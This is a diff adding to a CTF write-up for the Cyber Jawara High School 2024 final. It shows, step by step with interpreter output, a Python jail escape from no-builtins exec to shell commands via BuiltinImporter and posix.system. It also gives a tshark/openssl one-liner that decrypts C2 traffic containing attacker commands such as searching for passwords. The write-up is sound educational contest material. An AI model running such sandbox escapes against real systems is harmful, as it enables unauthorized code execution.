@@ -9,8 +9,7 @@ tags:
   - N2L
   - LastSeenIn2026
   - National
-  - High
-  - School
+  - SHS
 ---
 
 ## Cyber Jawara High School 2024 Final
@@ -463,7 +462,7 @@ if s.check() == sat:
 **Rating: [6/10]**
 
 I'm writing this write-up on the train lol.
-It's 2242 right now.
+It's 22:42 right now.
 Gotta sleep :p
 
 ## Misc
@@ -472,11 +471,232 @@ Gotta sleep :p
 
 #### Summary
 
-A standard no builtins.
+A standard no builtins pyjail, without length limit.
 
 #### Solution
 
-WIP
+So, we're given these files: `Dockerfile`, which contains [instructions](https://www.google.com/search?q=dockerfile+is&sourceid=chrome&ie=UTF-8#:~:text=Dockerfile%20reference,%E2%80%BA%20reference%20%E2%80%BA%20dockerfile) for building an Docker image;  
+`docker-compose.yml`, which 'define and share multi-container applications';  
+'flag.txt', our read target, locally contains `REDACTED`; and  
+`jail.py`, the Python code for the jail itself.
+
+Let's see the docker files first!
+
+{{< highlight docker >}}
+# Dockerfile
+FROM python:3.10-alpine AS app
+
+FROM pwn.red/jail
+COPY --from=app / /srv
+COPY jail.py /srv/app/run
+RUN chmod +x /srv/app/run
+COPY flag.txt /srv/flag.txt
+
+RUN chmod 444 /srv/flag.txt && mv /srv/flag.txt /srv/flag-$(head -c8 /dev/urandom | md5sum | tr -cd '[:alnum:]')
+ENV JAIL_MEM=20M
+{{< /highlight >}}
+
+This setup the docker image.
+You can see at line 10, it rename the file with a random md5sum.
+So, this means that we need to at least `ls` the file system to know the actual name in the remote instance.
+
+{{< highlight yaml >}}
+version: '3'
+
+services:
+  baby-pyjail:
+    build: .
+    restart: on-failure
+    privileged: true
+    ports:
+      - 7041:5000
+{{< /highlight >}}
+
+So, I guess we're privileged, hehe.
+You can delete the flag file though,
+since it was set to read-only for all users (including root).
+
+Aight, now how about the jail itself?
+
+{{< highlight py >}}
+#!/usr/local/bin/python3 -S
+
+def run_code(code):
+    # print(code)
+    # e(code, {'__builtins__': None, 'i': i})
+    e(code, {'__builtins__': None})
+
+i, e = input, exec
+user_input = i('>>> ')
+
+try:
+    run_code(user_input)
+    # print('ran')
+except:
+    # print('except')
+    pass
+{{< /highlight >}}
+
+Really short, it just sets `__builtins__` to `None`,
+effectively deleting it.
+built-in functions like `open` or `import` is gone.
+But, we can recover builtins,
+as object types still exists,
+like `()`, a tuple,
+or '""', a str.
+
+I debug this locally by building the docker,
+and modifying `jail.py` to print the result of the payload,
+either exception or ran.
+I also add `i` to the `e` globals argument,
+so I can call it to see what an expression returns.
+You can see these with the commented codes above.
+
+I started with getting the `object` class,
+
+```gdscript3
+>>> i(().__class__)
+i(().__class__)
+<class 'tuple'>
+ran
+>>> i(().__class__.__mro__)                  
+i(().__class__.__mro__)
+(<class 'tuple'>, <class 'object'>)
+ran
+```
+
+Got it!
+Now, we're using object introspection.
+This can be done by calling `__subclasses__()`
+to list all loaded classes in memory.
+We're looking for `os`, `subprocess`, or `open`.
+
+```gdscript3
+>>> i(().__class__.__mro__[1].__subclasses__)
+i(().__class__.__mro__[1].__subclasses__)
+<built-in method __subclasses__ of type object at 0xffffb2fa8698>
+ran
+>>> i(().__class__.__mro__[1].__subclasses__())
+i(().__class__.__mro__[1].__subclasses__())
+[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>]
+ran
+```
+
+Whww, that's a really long one :v  
+There's none of the classes specified earlier,
+but there's `_io` and `_frozen_importlib`.
+
+I first tried `_io` and its modules,
+but none seems to work,
+and that also the flag name is unknown.
+
+So I went with `_frozen_importlib` instead,
+and Arcanum said these functions are interesting:
+
+1. **`_frozen_importlib.BuiltinImporter`**
+2. **`_frozen_importlib.FrozenImporter`**
+3. **`_frozen_importlib_external.FileLoader`**
+4. **`_frozen_importlib_external.FileFinder`**
+
+If I tried `FrozenImporter`,
+it doesn't seems to have any useful modules...
+
+```gdscript3
+>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("sys"))
+i(().__class__.__bases__[0].__subclasses__()[104].exec_module("sys"))
+None
+ran
+>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("os"))
+i(().__class__.__bases__[0].__subclasses__()[104].exec_module("os"))
+None
+ran
+>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("subprocess"))
+i(().__class__.__bases__[0].__subclasses__()[104].exec_module("subprocess"))
+None
+ran
+```
+
+What works was `BuiltinImporter`,
+which has the `sys` module!! :o
+
+```gdscript3
+>>> i(().__class__.__mro__[1].__subclasses__()[104])
+i(().__class__.__mro__[1].__subclasses__()[104])
+<class '_frozen_importlib.BuiltinImporter'>
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("os"))
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("os"))
+except
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys"))
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys"))
+<module 'sys' (<class '_frozen_importlib.BuiltinImporter'>)>
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules)
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules)
+{'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module '_frozen_importlib' (frozen)>, '_imp': <module '_imp' (built-in)>, '_thread': <module '_thread' (built-in)>, '_warnings': <module '_warnings' (built-in)>, '_weakref': <module '_weakref' (built-in)>, '_io': <module '_io' (built-in)>, 'marshal': <module 'marshal' (built-in)>, 'posix': <module 'posix' (built-in)>, '_frozen_importlib_external': <module '_frozen_importlib_external' (frozen)>, 'time': <module 'time' (built-in)>, 'zipimport': <module 'zipimport' (frozen)>, '_codecs': <module '_codecs' (built-in)>, 'codecs': <module 'codecs' from '/usr/local/lib/python3.10/codecs.py'>, 'encodings.aliases': <module 'encodings.aliases' from '/usr/local/lib/python3.10/encodings/aliases.py'>, 'encodings': <module 'encodings' from '/usr/local/lib/python3.10/encodings/__init__.py'>, 'encodings.utf_8': <module 'encodings.utf_8' from '/usr/local/lib/python3.10/encodings/utf_8.py'>, '_signal': <module '_signal' (built-in)>, '_abc': <module '_abc' (built-in)>, 'abc': <module 'abc' from '/usr/local/lib/python3.10/abc.py'>, 'io': <module 'io' from '/usr/local/lib/python3.10/io.py'>, '__main__': <module '__main__' from '/app/run'>, 'sys': <module 'sys' (<class '_frozen_importlib.BuiltinImporter'>)>}
+ran
+```
+
+There's even `builtins` there!!  
+But here,
+I just use `posix` that allow me to execute shell commands
+with its `system` method.
+
+```
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('id'))
+uid=1000 gid=1000 groups=1000
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('id'))
+0
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('ls'))
+run
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('ls'))
+0
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('pwd'))
+/app
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('pwd'))
+0
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('ls ..'))
+app
+bin
+dev
+etc
+flag-e1399cacce39a164310d45edc2f5960a
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('ls ..'))
+0
+ran
+>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('cat ../flag-e1399cacce39a164310d45edc2f5960a'))
+REDACTED
+i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('cat ../flag-e1399cacce39a164310d45edc2f5960a'))
+0
+ran
+```
+
+That's the local flag :>  
+Now, just do it on the remote instance!
+
+![](pyjail.png)
+
+**Flag: `CJ{8bee73d086b2d224adcd60d5df27fe52}`**  
+**Rating: [8/10]**
+
+Pyjail is kinda fun ngl, I might make it my second cat., dawg :p
 
 ## Forensics
 
@@ -489,3 +709,20 @@ Upsolved! Given a .pcap, we extract a C2 backdoor binary, and with incoming open
 #### Solution
 
 WIP
+
+By the way, one guy just solve the chall with one command 🥶🥶
+
+```sh
+$ tshark -r c2.pcap -Y 'tcp.port eq 22222 and data.len > 8' -Tfields -e data | xargs -IZ bash -c 'echo $(echo Z | xxd -r -p | openssl enc -aes-128-ecb -d -K A7D35E2FB881F6C490DE6AC93B7E8FE2)'
+ls
+id
+find / | grep pass
+printf "CJ{8c05db2894cde846f4967bfa0274ad177d6e9f95b26d442c7046f8e7ea5c929f}" > /tmp/hacker_was_here
+cat /tmp/hacker_was_her
+cat /tmp/hacker_was_here
+id
+ls alt
+```
+
+What a lad.
+I gotta learn `openssl` for real duhh.
